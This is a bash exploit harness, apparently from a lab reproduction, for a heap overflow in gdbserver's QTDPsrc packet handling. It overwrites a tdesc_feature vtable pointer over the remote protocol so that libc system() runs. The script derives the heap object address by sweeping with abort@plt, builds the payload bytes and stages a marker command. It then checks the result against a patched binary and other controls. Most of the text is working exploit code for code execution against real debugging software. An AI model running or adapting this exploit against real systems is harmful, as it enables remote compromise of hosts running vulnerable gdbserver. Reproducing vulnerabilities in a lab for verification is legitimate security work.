#!/bin/bash
# Wire-only libc system() through the forged tdesc_feature vtable slot.
#
# No debugger.  Plant-started plain pinned gdbserver on loopback, ASLR off.
# A 64-byte SLEN=1 QTDPsrc packet overwrites the adjacent tdesc_feature
# vptr and fake slot +0x10.  The destructor's `call *%rax` passes rdi=object,
# whose first bytes are the vptr value; as a C string that is the vptr's
# little-endian bytes up to the first NUL.  Putting libc system()'s address
# in the slot makes the process run /bin/sh -c on that string.  A lab-
# installed executable of that exact name in the lab PATH directory is the
# lab-chosen benign command; its side effect is a marker file.
#
# The object address is DERIVED, not trusted: phase 1 sweeps candidate
# addresses with abort@plt in the slot and takes the one returning 134.
# The heap address depends on the build and the parent environment (W139),
# so a replay in another environment must re-derive it here.  PATH is
# replaced by a same-length value starting with the lab command directory,
# keeping the total environment size unchanged within a run.
#
# Shell-safety precondition (W6): system() hands the vptr's little-endian
# bytes to /bin/sh -c, so the derived command name must be a literal shell
# word.  If the derived vptr byte is a metacharacter (W140 saw 0x28 = '(',
# which makes /bin/sh -c fail with rc2 before PATH lookup), the harness
# records vuln-system as UNSUPPORTED rather than FAIL: the forged call is
# still reached, but no staged command can run under that name.  Exit 3
# means UNSUPPORTED environment; exit 1 means a real control failure.
#
# Controls in phase 2: fixed binary rejects the packet (E01, no marker);
# well-formed SLEN=16 packet leaves the object intact (no marker);
# abort@plt gives SIGABRT and no marker, distinguishing a call to system.
set -u
BIN=${1:?need plain vulnerable gdbserver binary}
FIXED=${2:?need fixed gdbserver binary}
HERE=$(cd "$(dirname "$0")" && pwd)
E="$HERE/evidence"
CMD="$HERE/r5-bin"
PY=/usr/bin/python3
SETARCH=/usr/bin/setarch
mkdir -p "$E" "$CMD"

LIBC=$(/usr/bin/ldd "$BIN" | /usr/bin/grep libc.so.6 | /usr/bin/awk '{print $3}')
BASE=$($SETARCH -R /usr/bin/ldd "$BIN" | /usr/bin/grep libc.so.6 | /usr/bin/grep -oE '0x[0-9a-f]+')
OFF=$($PY -c 'import subprocess,sys; out=subprocess.check_output(["nm","-D",sys.argv[1]],text=True); print(next(l.split()[0] for l in out.splitlines() if " system@@" in l))' "$LIBC")
SYSADDR=$((BASE + 16#$OFF))
SYSHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' "$SYSADDR")
echo "LIBC=$LIBC BASE=$BASE OFFSET=$OFF SYSTEM=0x$(printf %x "$SYSADDR") SLOT_HEX=$SYSHEX"

ABORT_HEX=701f565555550000
OLDLEN=${#PATH}
NEWPATH="$CMD:$(printf 'A%.0s' $(seq 1 $((OLDLEN-${#CMD}-1))))"
[ ${#NEWPATH} -eq "$OLDLEN" ] || { echo "PATH length mismatch"; exit 2; }

PORT=35040
VHEX=
payload() {
  printf '41%.0s' {1..24}
  printf '6100000000000000'
  printf '%s' "$VHEX"
  printf '42%.0s' {1..16}
  printf '%s' "$1"
}
start_and_probe() {
  local bin=$1 payload_hex=$2 slen=$3 log=$4 out=$5
  PORT=$((PORT+1))
  env PATH="$NEWPATH" "$SETARCH" -R "$bin" --once --debug=remote \
    "127.0.0.1:$PORT" /bin/true >"$log" 2>&1 &
  local s=$!
  for _ in $(seq 1 100); do
    /usr/bin/grep -q 'Listening on port' "$log" 2>/dev/null && break
    /bin/sleep 0.1
  done
  $PY "$HERE/live_probe_hex.py" "$PORT" "$payload_hex" "$slen" >"$out" 2>&1
  wait "$s"
  return $?
}

# Phase 1: derive the live object address from the SIGABRT/SIGSEGV boundary.
OBJ=
for n in $(seq 0 12); do
  cand=$((0x55555561c400 + n*0x10))
  VHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' $((cand+8)))
  start_and_probe "$BIN" "$(payload "$ABORT_HEX")" 1 \
    "$E/r5-system-sweep-$n.log" "$E/r5-system-sweep-$n.client.out"
  rc=$?
  echo "sweep obj=0x$(printf %x "$cand") rc=$rc"
  if [ "$rc" = 134 ]; then OBJ=$cand; break; fi
done
[ -n "$OBJ" ] || { echo "FAIL no object address produced SIGABRT"; exit 1; }
VPTR=$((OBJ+8))
VHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' "$VPTR")
echo "DERIVED obj=0x$(printf %x "$OBJ") vptr=0x$(printf %x "$VPTR")"

# The C string at rdi is the vptr's little-endian bytes up to the first NUL.
$PY - "$CMD" "$VPTR" "$CMD/marker" <<'PYEOF'
import os, sys
d, vptr, marker = sys.argv[1].encode(), int(sys.argv[2]), sys.argv[3].encode()
name = vptr.to_bytes(8, "little").split(b"\0", 1)[0]
p = os.path.join(d, name)
with open(p, "wb") as f:
    f.write(b"#!/bin/sh\n/bin/printf 'R5_SYSTEM_MARKER=1\\n' > " + marker + b"\n")
os.chmod(p, 0o755)
PYEOF

# system() runs /bin/sh -c on that exact name.  Require a literal shell word
# (ASCII letters/digits/_+-. or high bytes, which dash treats as literal),
# then confirm the syntax parses without executing anything.  W140's vptr
# low byte 0x28 ('(') fails both and cannot be made to run by staging a file.
SAFE_RESULT=$($PY - "$VPTR" <<'PYEOF'
import subprocess, sys
name = int(sys.argv[1]).to_bytes(8, "little").split(b"\0", 1)[0]
ok = bool(name) and all(
    (48 <= b <= 57) or (65 <= b <= 90) or (97 <= b <= 122)
    or b in b"_+-." or b >= 0x80 for b in name
)
if ok:
    ok = subprocess.run([b"/bin/sh", b"-n", b"-c", name],
                        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL).returncode == 0
print("%d %s" % (1 if ok else 0, name.hex()))
PYEOF
)
SHELL_SAFE=${SAFE_RESULT%% *}
NAME_HEX=${SAFE_RESULT#* }
echo "SHELL_SAFE=$SHELL_SAFE COMMAND_HEX=$NAME_HEX"

# Phase 2: vulnerable system call plus three controls.
FAIL=0
UNSUPPORTED=0
run_case() {
  local tag=$1 bin=$2 payload_hex=$3 expect_rc=$4 expect_marker=$5 slen=${6:-1}
  local log="$E/r5-system-$tag.log" out="$E/r5-system-$tag.client.out"
  /bin/rm -f "$CMD/marker"
  start_and_probe "$bin" "$payload_hex" "$slen" "$log" "$out"
  local rc=$?
  local marker=0
  [ -e "$CMD/marker" ] && marker=1
  { echo "MARKER=$marker"; [ "$marker" = 1 ] && /bin/cat "$CMD/marker"; } > "$E/r5-system-$tag.marker"
  if [ "$tag" = vuln-system ] && [ "$SHELL_SAFE" != 1 ]; then
    echo "UNSUPPORTED $tag SERVER_RC=$rc MARKER=$marker COMMAND_HEX=$NAME_HEX shell-unsafe derived name"
    UNSUPPORTED=$((UNSUPPORTED+1))
    return
  fi
  if [ "$rc" = "$expect_rc" ] && [ "$marker" = "$expect_marker" ]; then
    echo "PASS $tag SERVER_RC=$rc MARKER=$marker"
  else
    echo "FAIL $tag SERVER_RC=$rc EXPECT_RC=$expect_rc MARKER=$marker EXPECT_MARKER=$expect_marker"
    FAIL=$((FAIL+1))
  fi
}
run_case vuln-system  "$BIN"   "$(payload "$SYSHEX")"    0 1
run_case vuln-abort   "$BIN"   "$(payload "$ABORT_HEX")" 134 0
run_case fixed-system "$FIXED" "$(payload "$SYSHEX")"    0 0
run_case vuln-safe    "$BIN"   "$(printf '43%.0s' {1..16})" 0 0 16
/bin/rm -f "$CMD/marker"

# Explicit content hash: four client transcripts and four marker records in
# fixed case order.  No addresses or ports appear in these files, so the
# value is path- and port-independent by construction.
HASH=$(for t in vuln-system vuln-abort fixed-system vuln-safe; do
  /bin/cat "$E/r5-system-$t.client.out" "$E/r5-system-$t.marker"
done | /usr/bin/sha256sum | /usr/bin/cut -d' ' -f1)
echo "R5_NORMALIZED_HASH=$HASH"
echo "TOTAL FAIL=$FAIL UNSUPPORTED=$UNSUPPORTED"
[ "$UNSUPPORTED" -gt 0 ] && exit 3
exit "$FAIL"
